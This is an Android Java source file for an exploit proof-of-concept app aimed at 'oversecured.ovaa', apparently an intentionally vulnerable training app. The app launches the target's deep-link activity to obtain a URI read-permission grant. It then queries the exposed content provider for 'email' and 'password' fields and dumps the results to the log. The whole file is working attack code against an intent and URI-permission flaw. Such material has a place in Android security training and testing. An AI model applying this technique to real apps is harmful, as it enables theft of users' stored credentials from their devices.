package com.deeplink.exploitpoc;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.database.DatabaseUtils;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;


public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent i = new Intent(Intent.ACTION_VIEW);
        i.setData(Uri.parse("oversecured://ovaa/grant_uri_permissions"));
        i.setClassName("oversecured.ovaa","oversecured.ovaa.activities.DeeplinkActivity");
        Log.d("LOG","Started Main Activity from Exploit-APP");
        startActivityForResult(i,1001);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data){
        super.onActivityResult(requestCode,resultCode,data);
        //Log.d("LOG","resutcode : "+ resultCode+"\nrequestcode :  "+requestCode);
        if (resultCode == -1 && requestCode == 1001){
            Log.d("LOG","Got the intent with flag_read_uri_permission, now we can access content-provider");
            dump(data.getData());
        }
    }

    public void dump(Uri uri) {
        Uri myUri;
        myUri = uri;
        String[] str = new String[] {"email","password"};
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(myUri,str,null,null,null);
        Log.i("LOG","Dumping data\n");
        Log.e("LOG", DatabaseUtils.dumpCursorToString(c));
    }
}